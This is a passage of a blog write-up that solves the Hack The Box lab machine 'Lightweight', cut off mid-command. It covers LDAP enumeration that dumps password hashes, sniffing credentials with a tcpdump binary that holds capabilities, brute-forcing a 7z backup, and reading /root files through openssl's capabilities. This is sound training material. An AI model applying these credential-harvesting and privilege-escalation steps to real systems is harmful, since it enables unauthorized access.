<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Lightweight - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Lightweight"><a href="#Hack-The-Box-Lightweight" class="headerlink" title="Hack The Box - Lightweight"></a>Hack The Box - Lightweight</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Lightweight retired and here’s my write-up about it. Lightweight was a simple and a straightforward machine, I had fun solving it and I liked it. The idea behind the box is simple, We get initial ssh access then keep escalating privileges until we reach root. It’s a linux machine and its ip is <code>10.10.10.119</code>, I added it to <code>/etc/hosts</code> as <code>lightweight.htb</code>. Let’s jump right in.<br><img src="/images/hackthebox/lightweight/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with nmap to scan for open ports and services :<br><code>nmap -sV -sT -sC lightweight.htb</code><br><img src="/images/hackthebox/lightweight/1.png" alt=""><br>3 ports are open : 22 running ssh, 80 running http and 389 running ldap. Let’s check ldap first.</p>
<h2 id="Ldap-Enumeration"><a href="#Ldap-Enumeration" class="headerlink" title="Ldap Enumeration"></a>Ldap Enumeration</h2><p>To enumerate ldap I like to use a tool called <code>ldapsearch</code>, There’s also an <code>nmap</code> script called <code>ldap-search</code> that can do the same thing.<br><code>ldapsearch</code> :<br><code>ldapsearch -x -h lightweight.htb -b &quot;dc=lightweight,dc=htb&quot;</code><br>Full Output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;dc&#x3D;lightweight,dc&#x3D;htb&gt; with scope subtree</span><br><span class="line"># filter: (objectclass&#x3D;*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># lightweight.htb</span><br><span class="line">dn: dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: dcObject</span><br><span class="line">objectClass: organization</span><br><span class="line">o: lightweight htb</span><br><span class="line">dc: lightweight</span><br><span class="line"></span><br><span class="line"># Manager, lightweight.htb</span><br><span class="line">dn: cn&#x3D;Manager,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">objectClass: organizationalRole</span><br><span class="line">cn: Manager</span><br><span class="line">description: Directory Manager</span><br><span class="line"></span><br><span class="line"># People, lightweight.htb</span><br><span class="line">dn: ou&#x3D;People,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: People</span><br><span class="line"></span><br><span class="line"># Group, lightweight.htb</span><br><span class="line">dn: ou&#x3D;Group,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">objectClass: organizationalUnit</span><br><span class="line">ou: Group</span><br><span class="line"></span><br><span class="line"># ldapuser1, People, lightweight.htb</span><br><span class="line">dn: uid&#x3D;ldapuser1,ou&#x3D;People,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">uid: ldapuser1</span><br><span class="line">cn: ldapuser1</span><br><span class="line">sn: ldapuser1</span><br><span class="line">mail: ldapuser1@lightweight.htb</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R</span><br><span class="line"> oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv</span><br><span class="line">shadowLastChange: 17691</span><br><span class="line">shadowMin: 0</span><br><span class="line">shadowMax: 99999</span><br><span class="line">shadowWarning: 7</span><br><span class="line">loginShell: &#x2F;bin&#x2F;bash</span><br><span class="line">uidNumber: 1000</span><br><span class="line">gidNumber: 1000</span><br><span class="line">homeDirectory: &#x2F;home&#x2F;ldapuser1</span><br><span class="line"></span><br><span class="line"># ldapuser2, People, lightweight.htb</span><br><span class="line">dn: uid&#x3D;ldapuser2,ou&#x3D;People,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">uid: ldapuser2</span><br><span class="line">cn: ldapuser2</span><br><span class="line">sn: ldapuser2</span><br><span class="line">mail: ldapuser2@lightweight.htb</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: inetOrgPerson</span><br><span class="line">objectClass: posixAccount</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: shadowAccount</span><br><span class="line">userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms</span><br><span class="line"> zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x</span><br><span class="line">shadowLastChange: 17691</span><br><span class="line">shadowMin: 0</span><br><span class="line">shadowMax: 99999</span><br><span class="line">shadowWarning: 7</span><br><span class="line">loginShell: &#x2F;bin&#x2F;bash</span><br><span class="line">uidNumber: 1001</span><br><span class="line">gidNumber: 1001</span><br><span class="line">homeDirectory: &#x2F;home&#x2F;ldapuser2</span><br><span class="line"></span><br><span class="line"># ldapuser1, Group, lightweight.htb</span><br><span class="line">dn: cn&#x3D;ldapuser1,ou&#x3D;Group,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">objectClass: posixGroup</span><br><span class="line">objectClass: top</span><br><span class="line">cn: ldapuser1</span><br><span class="line">userPassword:: e2NyeXB0fXg&#x3D;</span><br><span class="line">gidNumber: 1000</span><br><span class="line"></span><br><span class="line"># ldapuser2, Group, lightweight.htb</span><br><span class="line">dn: cn&#x3D;ldapuser2,ou&#x3D;Group,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">objectClass: posixGroup</span><br><span class="line">objectClass: top</span><br><span class="line">cn: ldapuser2</span><br><span class="line">userPassword:: e2NyeXB0fXg&#x3D;</span><br><span class="line">gidNumber: 1001</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 9</span><br><span class="line"># numEntries: 8</span><br></pre></td></tr></table></figure>
<p><code>nmap</code> :<br><code>nmap --script=ldap-search lightweight.htb</code><br>Full Output :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.70 scan initiated Fri May 10 17:10:46 2019 as: nmap --script&#x3D;ldap-search -o ldap.nmap lightweight.htb</span><br><span class="line">Nmap scan report for lightweight.htb (10.10.10.119)</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22&#x2F;tcp  open  ssh</span><br><span class="line">80&#x2F;tcp  open  http</span><br><span class="line">389&#x2F;tcp open  ldap</span><br><span class="line">| ldap-search: </span><br><span class="line">|   Context: dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|     dn: dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: dcObject</span><br><span class="line">|         objectClass: organization</span><br><span class="line">|         o: lightweight htb</span><br><span class="line">|         dc: lightweight</span><br><span class="line">|     dn: cn&#x3D;Manager,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         objectClass: organizationalRole</span><br><span class="line">|         cn: Manager</span><br><span class="line">|         description: Directory Manager</span><br><span class="line">|     dn: ou&#x3D;People,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         objectClass: organizationalUnit</span><br><span class="line">|         ou: People</span><br><span class="line">|     dn: ou&#x3D;Group,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         objectClass: organizationalUnit</span><br><span class="line">|         ou: Group</span><br><span class="line">|     dn: uid&#x3D;ldapuser1,ou&#x3D;People,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         uid: ldapuser1</span><br><span class="line">|         cn: ldapuser1</span><br><span class="line">|         sn: ldapuser1</span><br><span class="line">|         mail: ldapuser1@lightweight.htb</span><br><span class="line">|         objectClass: person</span><br><span class="line">|         objectClass: organizationalPerson</span><br><span class="line">|         objectClass: inetOrgPerson</span><br><span class="line">|         objectClass: posixAccount</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: shadowAccount</span><br><span class="line">|         userPassword: &#123;crypt&#125;$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE&#x2F;g&#x2F;Z&#x2F;7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA.&#x2F;44&#x2F;</span><br><span class="line">|         shadowLastChange: 17691</span><br><span class="line">|         shadowMin: 0</span><br><span class="line">|         shadowMax: 99999</span><br><span class="line">|         shadowWarning: 7</span><br><span class="line">|         loginShell: &#x2F;bin&#x2F;bash</span><br><span class="line">|         uidNumber: 1000</span><br><span class="line">|         gidNumber: 1000</span><br><span class="line">|         homeDirectory: &#x2F;home&#x2F;ldapuser1</span><br><span class="line">|     dn: uid&#x3D;ldapuser2,ou&#x3D;People,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         uid: ldapuser2</span><br><span class="line">|         cn: ldapuser2</span><br><span class="line">|         sn: ldapuser2</span><br><span class="line">|         mail: ldapuser2@lightweight.htb</span><br><span class="line">|         objectClass: person</span><br><span class="line">|         objectClass: organizationalPerson</span><br><span class="line">|         objectClass: inetOrgPerson</span><br><span class="line">|         objectClass: posixAccount</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         objectClass: shadowAccount</span><br><span class="line">|         userPassword: &#123;crypt&#125;$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX&#x2F;QEfjdRQzgn1</span><br><span class="line">|         shadowLastChange: 17691</span><br><span class="line">|         shadowMin: 0</span><br><span class="line">|         shadowMax: 99999</span><br><span class="line">|         shadowWarning: 7</span><br><span class="line">|         loginShell: &#x2F;bin&#x2F;bash</span><br><span class="line">|         uidNumber: 1001</span><br><span class="line">|         gidNumber: 1001</span><br><span class="line">|         homeDirectory: &#x2F;home&#x2F;ldapuser2</span><br><span class="line">|     dn: cn&#x3D;ldapuser1,ou&#x3D;Group,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         objectClass: posixGroup</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         cn: ldapuser1</span><br><span class="line">|         userPassword: &#123;crypt&#125;x</span><br><span class="line">|         gidNumber: 1000</span><br><span class="line">|     dn: cn&#x3D;ldapuser2,ou&#x3D;Group,dc&#x3D;lightweight,dc&#x3D;htb</span><br><span class="line">|         objectClass: posixGroup</span><br><span class="line">|         objectClass: top</span><br><span class="line">|         cn: ldapuser2</span><br><span class="line">|         userPassword: &#123;crypt&#125;x</span><br><span class="line">|_        gidNumber: 1001</span><br><span class="line"></span><br><span class="line"># Nmap done at Fri May 10 17:11:03 2019 -- 1 IP address (1 host up) scanned in 17.35 seconds</span><br></pre></td></tr></table></figure>
<p>If we take a look at <code>ldapsearch</code> results :<br><img src="/images/hackthebox/lightweight/2.png" alt=""><br><img src="/images/hackthebox/lightweight/3.png" alt=""><br>We have some info for 2 users : <code>ldapuser1</code> and <code>ldapuser2</code>. <code>userPassword</code> is a base64 encoded string. I decoded it and got the same hashes I got from <code>ldap-search</code> <code>nmap</code> script :<br><img src="/images/hackthebox/lightweight/4.png" alt=""><br>However, I tried to crack the hashes and they didn’t crack. Let’s check http.</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Usually I use some tools for web like <code>gobuster</code> for example, But this time We can’t do that because we will get blocked as you can see :<br><img src="/images/hackthebox/lightweight/5.png" alt=""><br>Also the <code>info</code> page is saying the same thing :<br><img src="/images/hackthebox/lightweight/6.png" alt=""><br>And it’s also saying <code>If you like to get in the box, please go to the user page</code>. Let’s check <code>user</code> :<br><img src="/images/hackthebox/lightweight/7.png" alt=""><br>So we can login with ssh with the ip as the username and the password. Let’s try :<br><img src="/images/hackthebox/lightweight/8.png" alt=""><br>It’s working !</p>
<h2 id="Tcpdump-Capabilities-User-Flag"><a href="#Tcpdump-Capabilities-User-Flag" class="headerlink" title="Tcpdump Capabilities, User Flag"></a>Tcpdump Capabilities, User Flag</h2><p>One of the things I always check when enumerating linux filesystem is the binary capabilities. So I used <code>getcap</code> on some directories like <code>/bin</code>, <code>/usr/bin</code> and <code>/usr/sbin</code>. I noticed that <code>tcpdump</code> has <code>cap_net_admin,cap_net_raw+ep</code> capabilities.<br><img src="/images/hackthebox/lightweight/9.png" alt=""><br>From the <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank" rel="noopener">Linux Capabilities Manual</a> I found some info about these capabilities :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">**CAP_NET_ADMIN**</span><br><span class="line">              Perform various network-related operations:</span><br><span class="line">              * interface configuration;</span><br><span class="line">              * administration of IP firewall, masquerading, and accounting;</span><br><span class="line">              * modify routing tables;</span><br><span class="line">              * bind to any address for transparent proxying;</span><br><span class="line">              * set type-of-service (TOS)</span><br><span class="line">              * clear driver statistics;</span><br><span class="line">              * set promiscuous mode;</span><br><span class="line">              * enabling multicasting;</span><br><span class="line">              * use [setsockopt(2)](http:&#x2F;&#x2F;man7.org&#x2F;linux&#x2F;man-pages&#x2F;man2&#x2F;setsockopt.2.html) to set the following socket options:</span><br><span class="line">                **SO_DEBUG**, **SO_MARK**, **SO_PRIORITY** (for a priority outside the</span><br><span class="line">                range 0 to 6), **SO_RCVBUFFORCE**, and **SO_SNDBUFFORCE**.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**CAP_NET_RAW**</span><br><span class="line">             * Use RAW and PACKET sockets;</span><br><span class="line">             * bind to any address for transparent proxying.</span><br></pre></td></tr></table></figure>
<p>Great. I ran <code>tcpdump</code> on all the interfaces and saved the output to <code>captured.pcap</code> and I left it for some time :<br><code>tcpdump -i any -w captured.pcap</code><br><img src="/images/hackthebox/lightweight/10.png" alt=""><br>I downloaded the <code>pcap</code> on my box to open it with <code>wireshark</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 10.10.xx.xx@lightweight.htb:&#x2F;home&#x2F;10.10.xx.xx&#x2F;captured.pcap .&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/lightweight/11.png" alt=""><br>In <code>wireshark</code> I noticed an <code>LDAP</code> request :<br><img src="/images/hackthebox/lightweight/12.png" alt=""><br>I looked at it and found that it’s an authentication request :<br><img src="/images/hackthebox/lightweight/13.png" alt=""><br>Now we have the password for <code>ldapuser2</code> :    <code>8bc8251332abe1d7f105d3e53ad39ac2</code>. Lets <code>su</code> :<br><img src="/images/hackthebox/lightweight/14.png" alt=""><br><img src="/images/hackthebox/lightweight/15.png" alt=""><br>We owned user.</p>
<h2 id="Bruteforcing-7z-Hardcoded-Credentials-Privilege-Escalation-to-ldapuser1"><a href="#Bruteforcing-7z-Hardcoded-Credentials-Privilege-Escalation-to-ldapuser1" class="headerlink" title="Bruteforcing 7z, Hardcoded Credentials, Privilege Escalation to ldapuser1"></a>Bruteforcing <code>7z</code>, Hardcoded Credentials, Privilege Escalation to <code>ldapuser1</code></h2><p>In the <code>/home</code> directory of <code>ldapuser2</code> there was a backup file called <code>backup.7z</code>. I tried to extract it but it was password protected :<br><img src="/images/hackthebox/lightweight/16.png" alt=""><br>So I transferred it to my box to bruteforce it (<code>nc</code> wasn’t installed and I couldn’t use <code>scp</code> so I transferred it with base64 encoding/decoding) :<br><img src="/images/hackthebox/lightweight/17.png" alt=""><br><img src="/images/hackthebox/lightweight/18.png" alt=""><br><img src="/images/hackthebox/lightweight/19.png" alt=""><br>I used <a href="https://github.com/Seyptoo/7z-BruteForce" target="_blank" rel="noopener">this tool</a> to bruteforce the <code>7z</code> file :<br><code>python 7z.py backup.7z /usr/share/wordlists/rockyou.txt</code><br><img src="/images/hackthebox/lightweight/20.png" alt=""><br>The password is <code>delete</code>. After extraction we have some <code>php</code> files, Looks like the source of the web site hosted on port 80 :<br><img src="/images/hackthebox/lightweight/21.png" alt=""><br>I checked them all and in <code>status.php</code> I found hardcoded credentials for <code>ldapuser1</code> :<br><img src="/images/hackthebox/lightweight/22.png" alt=""><br>Now we can <code>su</code> to <code>ldapuser1</code> with the password : <code>f3ca9d298a553da117442deeb6fa932d</code> :<br><img src="/images/hackthebox/lightweight/23.png" alt=""></p>
<h2 id="Openssl-Capabilities-Root-Flag"><a href="#Openssl-Capabilities-Root-Flag" class="headerlink" title="Openssl Capabilities, Root Flag"></a>Openssl Capabilities, Root Flag</h2><p>I looked at the contents of <code>/home/ldapuser1</code> and I noticed some stuff. A <code>php</code> file called <code>ldapTLS.php</code> and two binaries : <code>openssl</code> and <code>tcpdump</code>.<br><img src="/images/hackthebox/lightweight/24.png" alt=""><br><code>cat ldapTLS.php</code><br><img src="/images/hackthebox/lightweight/25.png" alt=""><br>Nothing interesting. Lets check the binaries. (We don’t need <code>tcpdump</code> anymore so we will focus on <code>openssl</code>)<br>I checked the capabilities and I found that <code>openssl</code> has the <code>ep</code> capability which means it can read and write anything on the filesystem.<br><img src="/images/hackthebox/lightweight/26.png" alt=""><br>This  means that we can simply read the root flag by using the base64 encoding function in <code>openssl</code> then decoding the file :<br><code>./openssl enc -base64 -in /root/root.txt -out 